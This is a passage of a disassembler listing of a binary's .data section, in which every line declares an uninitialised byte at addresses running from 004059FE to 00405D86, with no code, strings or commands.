.data:004059FE                 db    ? ;
.data:004059FF                 db    ? ;
.data:00405A00                 db    ? ;
.data:00405A01                 db    ? ;
.data:00405A02                 db    ? ;
.data:00405A03                 db    ? ;
.data:00405A04                 db    ? ;
.data:00405A05                 db    ? ;
.data:00405A06                 db    ? ;
.data:00405A07                 db    ? ;
.data:00405A08                 db    ? ;
.data:00405A09                 db    ? ;
.data:00405A0A                 db    ? ;
.data:00405A0B                 db    ? ;
.data:00405A0C                 db    ? ;
.data:00405A0D                 db    ? ;
.data:00405A0E                 db    ? ;
.data:00405A0F                 db    ? ;
.data:00405A10                 db    ? ;
.data:00405A11                 db    ? ;
.data:00405A12                 db    ? ;
.data:00405A13                 db    ? ;
.data:00405A14                 db    ? ;
.data:00405A15                 db    ? ;
.data:00405A16                 db    ? ;
.data:00405A17                 db    ? ;
.data:00405A18                 db    ? ;
.data:00405A19                 db    ? ;
.data:00405A1A                 db    ? ;
.data:00405A1B                 db    ? ;
.data:00405A1C                 db    ? ;
.data:00405A1D                 db    ? ;
.data:00405A1E                 db    ? ;
.data:00405A1F                 db    ? ;
.data:00405A20                 db    ? ;
.data:00405A21                 db    ? ;
.data:00405A22                 db    ? ;
.data:00405A23                 db    ? ;
.data:00405A24                 db    ? ;
.data:00405A25                 db    ? ;
.data:00405A26                 db    ? ;
.data:00405A27                 db    ? ;
.data:00405A28                 db    ? ;
.data:00405A29                 db    ? ;
.data:00405A2A                 db    ? ;
.data:00405A2B                 db    ? ;
.data:00405A2C                 db    ? ;
.data:00405A2D                 db    ? ;
.data:00405A2E                 db    ? ;
.data:00405A2F                 db    ? ;
.data:00405A30                 db    ? ;
.data:00405A31                 db    ? ;
.data:00405A32                 db    ? ;
.data:00405A33                 db    ? ;
.data:00405A34                 db    ? ;
.data:00405A35                 db    ? ;
.data:00405A36                 db    ? ;
.data:00405A37                 db    ? ;
.data:00405A38                 db    ? ;
.data:00405A39                 db    ? ;
.data:00405A3A                 db    ? ;
.data:00405A3B                 db    ? ;
.data:00405A3C                 db    ? ;
.data:00405A3D                 db    ? ;
.data:00405A3E                 db    ? ;
.data:00405A3F                 db    ? ;
.data:00405A40                 db    ? ;
.data:00405A41                 db    ? ;
.data:00405A42                 db    ? ;
.data:00405A43                 db    ? ;
.data:00405A44                 db    ? ;
.data:00405A45                 db    ? ;
.data:00405A46                 db    ? ;
.data:00405A47                 db    ? ;
.data:00405A48                 db    ? ;
.data:00405A49                 db    ? ;
.data:00405A4A                 db    ? ;
.data:00405A4B                 db    ? ;
.data:00405A4C                 db    ? ;
.data:00405A4D                 db    ? ;
.data:00405A4E                 db    ? ;
.data:00405A4F                 db    ? ;
.data:00405A50                 db    ? ;
.data:00405A51                 db    ? ;
.data:00405A52                 db    ? ;
.data:00405A53                 db    ? ;
.data:00405A54                 db    ? ;
.data:00405A55                 db    ? ;
.data:00405A56                 db    ? ;
.data:00405A57                 db    ? ;
.data:00405A58                 db    ? ;
.data:00405A59                 db    ? ;
.data:00405A5A                 db    ? ;
.data:00405A5B                 db    ? ;
.data:00405A5C                 db    ? ;
.data:00405A5D                 db    ? ;
.data:00405A5E                 db    ? ;
.data:00405A5F                 db    ? ;
.data:00405A60                 db    ? ;
.data:00405A61                 db    ? ;
.data:00405A62                 db    ? ;
.data:00405A63                 db    ? ;
.data:00405A64                 db    ? ;
.data:00405A65                 db    ? ;
.data:00405A66                 db    ? ;
.data:00405A67                 db    ? ;
.data:00405A68                 db    ? ;
.data:00405A69                 db    ? ;
.data:00405A6A                 db    ? ;
.data:00405A6B                 db    ? ;
.data:00405A6C                 db    ? ;
.data:00405A6D                 db    ? ;
.data:00405A6E                 db    ? ;
.data:00405A6F                 db    ? ;
.data:00405A70                 db    ? ;
.data:00405A71                 db    ? ;
.data:00405A72                 db    ? ;
.data:00405A73                 db    ? ;
.data:00405A74                 db    ? ;
.data:00405A75                 db    ? ;
.data:00405A76                 db    ? ;
.data:00405A77                 db    ? ;
.data:00405A78                 db    ? ;
.data:00405A79                 db    ? ;
.data:00405A7A                 db    ? ;
.data:00405A7B                 db    ? ;
.data:00405A7C                 db    ? ;
.data:00405A7D                 db    ? ;
.data:00405A7E                 db    ? ;
.data:00405A7F                 db    ? ;
.data:00405A80                 db    ? ;
.data:00405A81                 db    ? ;
.data:00405A82                 db    ? ;
.data:00405A83                 db    ? ;
.data:00405A84                 db    ? ;
.data:00405A85                 db    ? ;
.data:00405A86                 db    ? ;
.data:00405A87                 db    ? ;
.data:00405A88                 db    ? ;
.data:00405A89                 db    ? ;
.data:00405A8A                 db    ? ;
.data:00405A8B                 db    ? ;
.data:00405A8C                 db    ? ;
.data:00405A8D                 db    ? ;
.data:00405A8E                 db    ? ;
.data:00405A8F                 db    ? ;
.data:00405A90                 db    ? ;
.data:00405A91                 db    ? ;
.data:00405A92                 db    ? ;
.data:00405A93                 db    ? ;
.data:00405A94                 db    ? ;
.data:00405A95                 db    ? ;
.data:00405A96                 db    ? ;
.data:00405A97                 db    ? ;
.data:00405A98                 db    ? ;
.data:00405A99                 db    ? ;
.data:00405A9A                 db    ? ;
.data:00405A9B                 db    ? ;
.data:00405A9C                 db    ? ;
.data:00405A9D                 db    ? ;
.data:00405A9E                 db    ? ;
.data:00405A9F                 db    ? ;
.data:00405AA0                 db    ? ;
.data:00405AA1                 db    ? ;
.data:00405AA2                 db    ? ;
.data:00405AA3                 db    ? ;
.data:00405AA4                 db    ? ;
.data:00405AA5                 db    ? ;
.data:00405AA6                 db    ? ;
.data:00405AA7                 db    ? ;
.data:00405AA8                 db    ? ;
.data:00405AA9                 db    ? ;
.data:00405AAA                 db    ? ;
.data:00405AAB                 db    ? ;
.data:00405AAC                 db    ? ;
.data:00405AAD                 db    ? ;
.data:00405AAE                 db    ? ;
.data:00405AAF                 db    ? ;
.data:00405AB0                 db    ? ;
.data:00405AB1                 db    ? ;
.data:00405AB2                 db    ? ;
.data:00405AB3                 db    ? ;
.data:00405AB4                 db    ? ;
.data:00405AB5                 db    ? ;
.data:00405AB6                 db    ? ;
.data:00405AB7                 db    ? ;
.data:00405AB8                 db    ? ;
.data:00405AB9                 db    ? ;
.data:00405ABA                 db    ? ;
.data:00405ABB                 db    ? ;
.data:00405ABC                 db    ? ;
.data:00405ABD                 db    ? ;
.data:00405ABE                 db    ? ;
.data:00405ABF                 db    ? ;
.data:00405AC0                 db    ? ;
.data:00405AC1                 db    ? ;
.data:00405AC2                 db    ? ;
.data:00405AC3                 db    ? ;
.data:00405AC4                 db    ? ;
.data:00405AC5                 db    ? ;
.data:00405AC6                 db    ? ;
.data:00405AC7                 db    ? ;
.data:00405AC8                 db    ? ;
.data:00405AC9                 db    ? ;
.data:00405ACA                 db    ? ;
.data:00405ACB                 db    ? ;
.data:00405ACC                 db    ? ;
.data:00405ACD                 db    ? ;
.data:00405ACE                 db    ? ;
.data:00405ACF                 db    ? ;
.data:00405AD0                 db    ? ;
.data:00405AD1                 db    ? ;
.data:00405AD2                 db    ? ;
.data:00405AD3                 db    ? ;
.data:00405AD4                 db    ? ;
.data:00405AD5                 db    ? ;
.data:00405AD6                 db    ? ;
.data:00405AD7                 db    ? ;
.data:00405AD8                 db    ? ;
.data:00405AD9                 db    ? ;
.data:00405ADA                 db    ? ;
.data:00405ADB                 db    ? ;
.data:00405ADC                 db    ? ;
.data:00405ADD                 db    ? ;
.data:00405ADE                 db    ? ;
.data:00405ADF                 db    ? ;
.data:00405AE0                 db    ? ;
.data:00405AE1                 db    ? ;
.data:00405AE2                 db    ? ;
.data:00405AE3                 db    ? ;
.data:00405AE4                 db    ? ;
.data:00405AE5                 db    ? ;
.data:00405AE6                 db    ? ;
.data:00405AE7                 db    ? ;
.data:00405AE8                 db    ? ;
.data:00405AE9                 db    ? ;
.data:00405AEA                 db    ? ;
.data:00405AEB                 db    ? ;
.data:00405AEC                 db    ? ;
.data:00405AED                 db    ? ;
.data:00405AEE                 db    ? ;
.data:00405AEF                 db    ? ;
.data:00405AF0                 db    ? ;
.data:00405AF1                 db    ? ;
.data:00405AF2                 db    ? ;
.data:00405AF3                 db    ? ;
.data:00405AF4                 db    ? ;
.data:00405AF5                 db    ? ;
.data:00405AF6                 db    ? ;
.data:00405AF7                 db    ? ;
.data:00405AF8                 db    ? ;
.data:00405AF9                 db    ? ;
.data:00405AFA                 db    ? ;
.data:00405AFB                 db    ? ;
.data:00405AFC                 db    ? ;
.data:00405AFD                 db    ? ;
.data:00405AFE                 db    ? ;
.data:00405AFF                 db    ? ;
.data:00405B00                 db    ? ;
.data:00405B01                 db    ? ;
.data:00405B02                 db    ? ;
.data:00405B03                 db    ? ;
.data:00405B04                 db    ? ;
.data:00405B05                 db    ? ;
.data:00405B06                 db    ? ;
.data:00405B07                 db    ? ;
.data:00405B08                 db    ? ;
.data:00405B09                 db    ? ;
.data:00405B0A                 db    ? ;
.data:00405B0B                 db    ? ;
.data:00405B0C                 db    ? ;
.data:00405B0D                 db    ? ;
.data:00405B0E                 db    ? ;
.data:00405B0F                 db    ? ;
.data:00405B10                 db    ? ;
.data:00405B11                 db    ? ;
.data:00405B12                 db    ? ;
.data:00405B13                 db    ? ;
.data:00405B14                 db    ? ;
.data:00405B15                 db    ? ;
.data:00405B16                 db    ? ;
.data:00405B17                 db    ? ;
.data:00405B18                 db    ? ;
.data:00405B19                 db    ? ;
.data:00405B1A                 db    ? ;
.data:00405B1B                 db    ? ;
.data:00405B1C                 db    ? ;
.data:00405B1D                 db    ? ;
.data:00405B1E                 db    ? ;
.data:00405B1F                 db    ? ;
.data:00405B20                 db    ? ;
.data:00405B21                 db    ? ;
.data:00405B22                 db    ? ;
.data:00405B23                 db    ? ;
.data:00405B24                 db    ? ;
.data:00405B25                 db    ? ;
.data:00405B26                 db    ? ;
.data:00405B27                 db    ? ;
.data:00405B28                 db    ? ;
.data:00405B29                 db    ? ;
.data:00405B2A                 db    ? ;
.data:00405B2B                 db    ? ;
.data:00405B2C                 db    ? ;
.data:00405B2D                 db    ? ;
.data:00405B2E                 db    ? ;
.data:00405B2F                 db    ? ;
.data:00405B30                 db    ? ;
.data:00405B31                 db    ? ;
.data:00405B32                 db    ? ;
.data:00405B33                 db    ? ;
.data:00405B34                 db    ? ;
.data:00405B35                 db    ? ;
.data:00405B36                 db    ? ;
.data:00405B37                 db    ? ;
.data:00405B38                 db    ? ;
.data:00405B39                 db    ? ;
.data:00405B3A                 db    ? ;
.data:00405B3B                 db    ? ;
.data:00405B3C                 db    ? ;
.data:00405B3D                 db    ? ;
.data:00405B3E                 db    ? ;
.data:00405B3F                 db    ? ;
.data:00405B40                 db    ? ;
.data:00405B41                 db    ? ;
.data:00405B42                 db    ? ;
.data:00405B43                 db    ? ;
.data:00405B44                 db    ? ;
.data:00405B45                 db    ? ;
.data:00405B46                 db    ? ;
.data:00405B47                 db    ? ;
.data:00405B48                 db    ? ;
.data:00405B49                 db    ? ;
.data:00405B4A                 db    ? ;
.data:00405B4B                 db    ? ;
.data:00405B4C                 db    ? ;
.data:00405B4D                 db    ? ;
.data:00405B4E                 db    ? ;
.data:00405B4F                 db    ? ;
.data:00405B50                 db    ? ;
.data:00405B51                 db    ? ;
.data:00405B52                 db    ? ;
.data:00405B53                 db    ? ;
.data:00405B54                 db    ? ;
.data:00405B55                 db    ? ;
.data:00405B56                 db    ? ;
.data:00405B57                 db    ? ;
.data:00405B58                 db    ? ;
.data:00405B59                 db    ? ;
.data:00405B5A                 db    ? ;
.data:00405B5B                 db    ? ;
.data:00405B5C                 db    ? ;
.data:00405B5D                 db    ? ;
.data:00405B5E                 db    ? ;
.data:00405B5F                 db    ? ;
.data:00405B60                 db    ? ;
.data:00405B61                 db    ? ;
.data:00405B62                 db    ? ;
.data:00405B63                 db    ? ;
.data:00405B64                 db    ? ;
.data:00405B65                 db    ? ;
.data:00405B66                 db    ? ;
.data:00405B67                 db    ? ;
.data:00405B68                 db    ? ;
.data:00405B69                 db    ? ;
.data:00405B6A                 db    ? ;
.data:00405B6B                 db    ? ;
.data:00405B6C                 db    ? ;
.data:00405B6D                 db    ? ;
.data:00405B6E                 db    ? ;
.data:00405B6F                 db    ? ;
.data:00405B70                 db    ? ;
.data:00405B71                 db    ? ;
.data:00405B72                 db    ? ;
.data:00405B73                 db    ? ;
.data:00405B74                 db    ? ;
.data:00405B75                 db    ? ;
.data:00405B76                 db    ? ;
.data:00405B77                 db    ? ;
.data:00405B78                 db    ? ;
.data:00405B79                 db    ? ;
.data:00405B7A                 db    ? ;
.data:00405B7B                 db    ? ;
.data:00405B7C                 db    ? ;
.data:00405B7D                 db    ? ;
.data:00405B7E                 db    ? ;
.data:00405B7F                 db    ? ;
.data:00405B80                 db    ? ;
.data:00405B81                 db    ? ;
.data:00405B82                 db    ? ;
.data:00405B83                 db    ? ;
.data:00405B84                 db    ? ;
.data:00405B85                 db    ? ;
.data:00405B86                 db    ? ;
.data:00405B87                 db    ? ;
.data:00405B88                 db    ? ;
.data:00405B89                 db    ? ;
.data:00405B8A                 db    ? ;
.data:00405B8B                 db    ? ;
.data:00405B8C                 db    ? ;
.data:00405B8D                 db    ? ;
.data:00405B8E                 db    ? ;
.data:00405B8F                 db    ? ;
.data:00405B90                 db    ? ;
.data:00405B91                 db    ? ;
.data:00405B92                 db    ? ;
.data:00405B93                 db    ? ;
.data:00405B94                 db    ? ;
.data:00405B95                 db    ? ;
.data:00405B96                 db    ? ;
.data:00405B97                 db    ? ;
.data:00405B98                 db    ? ;
.data:00405B99                 db    ? ;
.data:00405B9A                 db    ? ;
.data:00405B9B                 db    ? ;
.data:00405B9C                 db    ? ;
.data:00405B9D                 db    ? ;
.data:00405B9E                 db    ? ;
.data:00405B9F                 db    ? ;
.data:00405BA0                 db    ? ;
.data:00405BA1                 db    ? ;
.data:00405BA2                 db    ? ;
.data:00405BA3                 db    ? ;
.data:00405BA4                 db    ? ;
.data:00405BA5                 db    ? ;
.data:00405BA6                 db    ? ;
.data:00405BA7                 db    ? ;
.data:00405BA8                 db    ? ;
.data:00405BA9                 db    ? ;
.data:00405BAA                 db    ? ;
.data:00405BAB                 db    ? ;
.data:00405BAC                 db    ? ;
.data:00405BAD                 db    ? ;
.data:00405BAE                 db    ? ;
.data:00405BAF                 db    ? ;
.data:00405BB0                 db    ? ;
.data:00405BB1                 db    ? ;
.data:00405BB2                 db    ? ;
.data:00405BB3                 db    ? ;
.data:00405BB4                 db    ? ;
.data:00405BB5                 db    ? ;
.data:00405BB6                 db    ? ;
.data:00405BB7                 db    ? ;
.data:00405BB8                 db    ? ;
.data:00405BB9                 db    ? ;
.data:00405BBA                 db    ? ;
.data:00405BBB                 db    ? ;
.data:00405BBC                 db    ? ;
.data:00405BBD                 db    ? ;
.data:00405BBE                 db    ? ;
.data:00405BBF                 db    ? ;
.data:00405BC0                 db    ? ;
.data:00405BC1                 db    ? ;
.data:00405BC2                 db    ? ;
.data:00405BC3                 db    ? ;
.data:00405BC4                 db    ? ;
.data:00405BC5                 db    ? ;
.data:00405BC6                 db    ? ;
.data:00405BC7                 db    ? ;
.data:00405BC8                 db    ? ;
.data:00405BC9                 db    ? ;
.data:00405BCA                 db    ? ;
.data:00405BCB                 db    ? ;
.data:00405BCC                 db    ? ;
.data:00405BCD                 db    ? ;
.data:00405BCE                 db    ? ;
.data:00405BCF                 db    ? ;
.data:00405BD0                 db    ? ;
.data:00405BD1                 db    ? ;
.data:00405BD2                 db    ? ;
.data:00405BD3                 db    ? ;
.data:00405BD4                 db    ? ;
.data:00405BD5                 db    ? ;
.data:00405BD6                 db    ? ;
.data:00405BD7                 db    ? ;
.data:00405BD8                 db    ? ;
.data:00405BD9                 db    ? ;
.data:00405BDA                 db    ? ;
.data:00405BDB                 db    ? ;
.data:00405BDC                 db    ? ;
.data:00405BDD                 db    ? ;
.data:00405BDE                 db    ? ;
.data:00405BDF                 db    ? ;
.data:00405BE0                 db    ? ;
.data:00405BE1                 db    ? ;
.data:00405BE2                 db    ? ;
.data:00405BE3                 db    ? ;
.data:00405BE4                 db    ? ;
.data:00405BE5                 db    ? ;
.data:00405BE6                 db    ? ;
.data:00405BE7                 db    ? ;
.data:00405BE8                 db    ? ;
.data:00405BE9                 db    ? ;
.data:00405BEA                 db    ? ;
.data:00405BEB                 db    ? ;
.data:00405BEC                 db    ? ;
.data:00405BED                 db    ? ;
.data:00405BEE                 db    ? ;
.data:00405BEF                 db    ? ;
.data:00405BF0                 db    ? ;
.data:00405BF1                 db    ? ;
.data:00405BF2                 db    ? ;
.data:00405BF3                 db    ? ;
.data:00405BF4                 db    ? ;
.data:00405BF5                 db    ? ;
.data:00405BF6                 db    ? ;
.data:00405BF7                 db    ? ;
.data:00405BF8                 db    ? ;
.data:00405BF9                 db    ? ;
.data:00405BFA                 db    ? ;
.data:00405BFB                 db    ? ;
.data:00405BFC                 db    ? ;
.data:00405BFD                 db    ? ;
.data:00405BFE                 db    ? ;
.data:00405BFF                 db    ? ;
.data:00405C00                 db    ? ;
.data:00405C01                 db    ? ;
.data:00405C02                 db    ? ;
.data:00405C03                 db    ? ;
.data:00405C04                 db    ? ;
.data:00405C05                 db    ? ;
.data:00405C06                 db    ? ;
.data:00405C07                 db    ? ;
.data:00405C08                 db    ? ;
.data:00405C09                 db    ? ;
.data:00405C0A                 db    ? ;
.data:00405C0B                 db    ? ;
.data:00405C0C                 db    ? ;
.data:00405C0D                 db    ? ;
.data:00405C0E                 db    ? ;
.data:00405C0F                 db    ? ;
.data:00405C10                 db    ? ;
.data:00405C11                 db    ? ;
.data:00405C12                 db    ? ;
.data:00405C13                 db    ? ;
.data:00405C14                 db    ? ;
.data:00405C15                 db    ? ;
.data:00405C16                 db    ? ;
.data:00405C17                 db    ? ;
.data:00405C18                 db    ? ;
.data:00405C19                 db    ? ;
.data:00405C1A                 db    ? ;
.data:00405C1B                 db    ? ;
.data:00405C1C                 db    ? ;
.data:00405C1D                 db    ? ;
.data:00405C1E                 db    ? ;
.data:00405C1F                 db    ? ;
.data:00405C20                 db    ? ;
.data:00405C21                 db    ? ;
.data:00405C22                 db    ? ;
.data:00405C23                 db    ? ;
.data:00405C24                 db    ? ;
.data:00405C25                 db    ? ;
.data:00405C26                 db    ? ;
.data:00405C27                 db    ? ;
.data:00405C28                 db    ? ;
.data:00405C29                 db    ? ;
.data:00405C2A                 db    ? ;
.data:00405C2B                 db    ? ;
.data:00405C2C                 db    ? ;
.data:00405C2D                 db    ? ;
.data:00405C2E                 db    ? ;
.data:00405C2F                 db    ? ;
.data:00405C30                 db    ? ;
.data:00405C31                 db    ? ;
.data:00405C32                 db    ? ;
.data:00405C33                 db    ? ;
.data:00405C34                 db    ? ;
.data:00405C35                 db    ? ;
.data:00405C36                 db    ? ;
.data:00405C37                 db    ? ;
.data:00405C38                 db    ? ;
.data:00405C39                 db    ? ;
.data:00405C3A                 db    ? ;
.data:00405C3B                 db    ? ;
.data:00405C3C                 db    ? ;
.data:00405C3D                 db    ? ;
.data:00405C3E                 db    ? ;
.data:00405C3F                 db    ? ;
.data:00405C40                 db    ? ;
.data:00405C41                 db    ? ;
.data:00405C42                 db    ? ;
.data:00405C43                 db    ? ;
.data:00405C44                 db    ? ;
.data:00405C45                 db    ? ;
.data:00405C46                 db    ? ;
.data:00405C47                 db    ? ;
.data:00405C48                 db    ? ;
.data:00405C49                 db    ? ;
.data:00405C4A                 db    ? ;
.data:00405C4B                 db    ? ;
.data:00405C4C                 db    ? ;
.data:00405C4D                 db    ? ;
.data:00405C4E                 db    ? ;
.data:00405C4F                 db    ? ;
.data:00405C50                 db    ? ;
.data:00405C51                 db    ? ;
.data:00405C52                 db    ? ;
.data:00405C53                 db    ? ;
.data:00405C54                 db    ? ;
.data:00405C55                 db    ? ;
.data:00405C56                 db    ? ;
.data:00405C57                 db    ? ;
.data:00405C58                 db    ? ;
.data:00405C59                 db    ? ;
.data:00405C5A                 db    ? ;
.data:00405C5B                 db    ? ;
.data:00405C5C                 db    ? ;
.data:00405C5D                 db    ? ;
.data:00405C5E                 db    ? ;
.data:00405C5F                 db    ? ;
.data:00405C60                 db    ? ;
.data:00405C61                 db    ? ;
.data:00405C62                 db    ? ;
.data:00405C63                 db    ? ;
.data:00405C64                 db    ? ;
.data:00405C65                 db    ? ;
.data:00405C66                 db    ? ;
.data:00405C67                 db    ? ;
.data:00405C68                 db    ? ;
.data:00405C69                 db    ? ;
.data:00405C6A                 db    ? ;
.data:00405C6B                 db    ? ;
.data:00405C6C                 db    ? ;
.data:00405C6D                 db    ? ;
.data:00405C6E                 db    ? ;
.data:00405C6F                 db    ? ;
.data:00405C70                 db    ? ;
.data:00405C71                 db    ? ;
.data:00405C72                 db    ? ;
.data:00405C73                 db    ? ;
.data:00405C74                 db    ? ;
.data:00405C75                 db    ? ;
.data:00405C76                 db    ? ;
.data:00405C77                 db    ? ;
.data:00405C78                 db    ? ;
.data:00405C79                 db    ? ;
.data:00405C7A                 db    ? ;
.data:00405C7B                 db    ? ;
.data:00405C7C                 db    ? ;
.data:00405C7D                 db    ? ;
.data:00405C7E                 db    ? ;
.data:00405C7F                 db    ? ;
.data:00405C80                 db    ? ;
.data:00405C81                 db    ? ;
.data:00405C82                 db    ? ;
.data:00405C83                 db    ? ;
.data:00405C84                 db    ? ;
.data:00405C85                 db    ? ;
.data:00405C86                 db    ? ;
.data:00405C87                 db    ? ;
.data:00405C88                 db    ? ;
.data:00405C89                 db    ? ;
.data:00405C8A                 db    ? ;
.data:00405C8B                 db    ? ;
.data:00405C8C                 db    ? ;
.data:00405C8D                 db    ? ;
.data:00405C8E                 db    ? ;
.data:00405C8F                 db    ? ;
.data:00405C90                 db    ? ;
.data:00405C91                 db    ? ;
.data:00405C92                 db    ? ;
.data:00405C93                 db    ? ;
.data:00405C94                 db    ? ;
.data:00405C95                 db    ? ;
.data:00405C96                 db    ? ;
.data:00405C97                 db    ? ;
.data:00405C98                 db    ? ;
.data:00405C99                 db    ? ;
.data:00405C9A                 db    ? ;
.data:00405C9B                 db    ? ;
.data:00405C9C                 db    ? ;
.data:00405C9D                 db    ? ;
.data:00405C9E                 db    ? ;
.data:00405C9F                 db    ? ;
.data:00405CA0                 db    ? ;
.data:00405CA1                 db    ? ;
.data:00405CA2                 db    ? ;
.data:00405CA3                 db    ? ;
.data:00405CA4                 db    ? ;
.data:00405CA5                 db    ? ;
.data:00405CA6                 db    ? ;
.data:00405CA7                 db    ? ;
.data:00405CA8                 db    ? ;
.data:00405CA9                 db    ? ;
.data:00405CAA                 db    ? ;
.data:00405CAB                 db    ? ;
.data:00405CAC                 db    ? ;
.data:00405CAD                 db    ? ;
.data:00405CAE                 db    ? ;
.data:00405CAF                 db    ? ;
.data:00405CB0                 db    ? ;
.data:00405CB1                 db    ? ;
.data:00405CB2                 db    ? ;
.data:00405CB3                 db    ? ;
.data:00405CB4                 db    ? ;
.data:00405CB5                 db    ? ;
.data:00405CB6                 db    ? ;
.data:00405CB7                 db    ? ;
.data:00405CB8                 db    ? ;
.data:00405CB9                 db    ? ;
.data:00405CBA                 db    ? ;
.data:00405CBB                 db    ? ;
.data:00405CBC                 db    ? ;
.data:00405CBD                 db    ? ;
.data:00405CBE                 db    ? ;
.data:00405CBF                 db    ? ;
.data:00405CC0                 db    ? ;
.data:00405CC1                 db    ? ;
.data:00405CC2                 db    ? ;
.data:00405CC3                 db    ? ;
.data:00405CC4                 db    ? ;
.data:00405CC5                 db    ? ;
.data:00405CC6                 db    ? ;
.data:00405CC7                 db    ? ;
.data:00405CC8                 db    ? ;
.data:00405CC9                 db    ? ;
.data:00405CCA                 db    ? ;
.data:00405CCB                 db    ? ;
.data:00405CCC                 db    ? ;
.data:00405CCD                 db    ? ;
.data:00405CCE                 db    ? ;
.data:00405CCF                 db    ? ;
.data:00405CD0                 db    ? ;
.data:00405CD1                 db    ? ;
.data:00405CD2                 db    ? ;
.data:00405CD3                 db    ? ;
.data:00405CD4                 db    ? ;
.data:00405CD5                 db    ? ;
.data:00405CD6                 db    ? ;
.data:00405CD7                 db    ? ;
.data:00405CD8                 db    ? ;
.data:00405CD9                 db    ? ;
.data:00405CDA                 db    ? ;
.data:00405CDB                 db    ? ;
.data:00405CDC                 db    ? ;
.data:00405CDD                 db    ? ;
.data:00405CDE                 db    ? ;
.data:00405CDF                 db    ? ;
.data:00405CE0                 db    ? ;
.data:00405CE1                 db    ? ;
.data:00405CE2                 db    ? ;
.data:00405CE3                 db    ? ;
.data:00405CE4                 db    ? ;
.data:00405CE5                 db    ? ;
.data:00405CE6                 db    ? ;
.data:00405CE7                 db    ? ;
.data:00405CE8                 db    ? ;
.data:00405CE9                 db    ? ;
.data:00405CEA                 db    ? ;
.data:00405CEB                 db    ? ;
.data:00405CEC                 db    ? ;
.data:00405CED                 db    ? ;
.data:00405CEE                 db    ? ;
.data:00405CEF                 db    ? ;
.data:00405CF0                 db    ? ;
.data:00405CF1                 db    ? ;
.data:00405CF2                 db    ? ;
.data:00405CF3                 db    ? ;
.data:00405CF4                 db    ? ;
.data:00405CF5                 db    ? ;
.data:00405CF6                 db    ? ;
.data:00405CF7                 db    ? ;
.data:00405CF8                 db    ? ;
.data:00405CF9                 db    ? ;
.data:00405CFA                 db    ? ;
.data:00405CFB                 db    ? ;
.data:00405CFC                 db    ? ;
.data:00405CFD                 db    ? ;
.data:00405CFE                 db    ? ;
.data:00405CFF                 db    ? ;
.data:00405D00                 db    ? ;
.data:00405D01                 db    ? ;
.data:00405D02                 db    ? ;
.data:00405D03                 db    ? ;
.data:00405D04                 db    ? ;
.data:00405D05                 db    ? ;
.data:00405D06                 db    ? ;
.data:00405D07                 db    ? ;
.data:00405D08                 db    ? ;
.data:00405D09                 db    ? ;
.data:00405D0A                 db    ? ;
.data:00405D0B                 db    ? ;
.data:00405D0C                 db    ? ;
.data:00405D0D                 db    ? ;
.data:00405D0E                 db    ? ;
.data:00405D0F                 db    ? ;
.data:00405D10                 db    ? ;
.data:00405D11                 db    ? ;
.data:00405D12                 db    ? ;
.data:00405D13                 db    ? ;
.data:00405D14                 db    ? ;
.data:00405D15                 db    ? ;
.data:00405D16                 db    ? ;
.data:00405D17                 db    ? ;
.data:00405D18                 db    ? ;
.data:00405D19                 db    ? ;
.data:00405D1A                 db    ? ;
.data:00405D1B                 db    ? ;
.data:00405D1C                 db    ? ;
.data:00405D1D                 db    ? ;
.data:00405D1E                 db    ? ;
.data:00405D1F                 db    ? ;
.data:00405D20                 db    ? ;
.data:00405D21                 db    ? ;
.data:00405D22                 db    ? ;
.data:00405D23                 db    ? ;
.data:00405D24                 db    ? ;
.data:00405D25                 db    ? ;
.data:00405D26                 db    ? ;
.data:00405D27                 db    ? ;
.data:00405D28                 db    ? ;
.data:00405D29                 db    ? ;
.data:00405D2A                 db    ? ;
.data:00405D2B                 db    ? ;
.data:00405D2C                 db    ? ;
.data:00405D2D                 db    ? ;
.data:00405D2E                 db    ? ;
.data:00405D2F                 db    ? ;
.data:00405D30                 db    ? ;
.data:00405D31                 db    ? ;
.data:00405D32                 db    ? ;
.data:00405D33                 db    ? ;
.data:00405D34                 db    ? ;
.data:00405D35                 db    ? ;
.data:00405D36                 db    ? ;
.data:00405D37                 db    ? ;
.data:00405D38                 db    ? ;
.data:00405D39                 db    ? ;
.data:00405D3A                 db    ? ;
.data:00405D3B                 db    ? ;
.data:00405D3C                 db    ? ;
.data:00405D3D                 db    ? ;
.data:00405D3E                 db    ? ;
.data:00405D3F                 db    ? ;
.data:00405D40                 db    ? ;
.data:00405D41                 db    ? ;
.data:00405D42                 db    ? ;
.data:00405D43                 db    ? ;
.data:00405D44                 db    ? ;
.data:00405D45                 db    ? ;
.data:00405D46                 db    ? ;
.data:00405D47                 db    ? ;
.data:00405D48                 db    ? ;
.data:00405D49                 db    ? ;
.data:00405D4A                 db    ? ;
.data:00405D4B                 db    ? ;
.data:00405D4C                 db    ? ;
.data:00405D4D                 db    ? ;
.data:00405D4E                 db    ? ;
.data:00405D4F                 db    ? ;
.data:00405D50                 db    ? ;
.data:00405D51                 db    ? ;
.data:00405D52                 db    ? ;
.data:00405D53                 db    ? ;
.data:00405D54                 db    ? ;
.data:00405D55                 db    ? ;
.data:00405D56                 db    ? ;
.data:00405D57                 db    ? ;
.data:00405D58                 db    ? ;
.data:00405D59                 db    ? ;
.data:00405D5A                 db    ? ;
.data:00405D5B                 db    ? ;
.data:00405D5C                 db    ? ;
.data:00405D5D                 db    ? ;
.data:00405D5E                 db    ? ;
.data:00405D5F                 db    ? ;
.data:00405D60                 db    ? ;
.data:00405D61                 db    ? ;
.data:00405D62                 db    ? ;
.data:00405D63                 db    ? ;
.data:00405D64                 db    ? ;
.data:00405D65                 db    ? ;
.data:00405D66                 db    ? ;
.data:00405D67                 db    ? ;
.data:00405D68                 db    ? ;
.data:00405D69                 db    ? ;
.data:00405D6A                 db    ? ;
.data:00405D6B                 db    ? ;
.data:00405D6C                 db    ? ;
.data:00405D6D                 db    ? ;
.data:00405D6E                 db    ? ;
.data:00405D6F                 db    ? ;
.data:00405D70                 db    ? ;
.data:00405D71                 db    ? ;
.data:00405D72                 db    ? ;
.data:00405D73                 db    ? ;
.data:00405D74                 db    ? ;
.data:00405D75                 db    ? ;
.data:00405D76                 db    ? ;
.data:00405D77                 db    ? ;
.data:00405D78                 db    ? ;
.data:00405D79                 db    ? ;
.data:00405D7A                 db    ? ;
.data:00405D7B                 db    ? ;
.data:00405D7C                 db    ? ;
.data:00405D7D                 db    ? ;
.data:00405D7E                 db    ? ;
.data:00405D7F                 db    ? ;
.data:00405D80                 db    ? ;
.data:00405D81                 db    ? ;
.data:00405D82                 db    ? ;
.data:00405D83                 db    ? ;
.data:00405D84                 db    ? ;
.data:00405D85                 db    ? ;
.data:00405D86                 db    ? ;
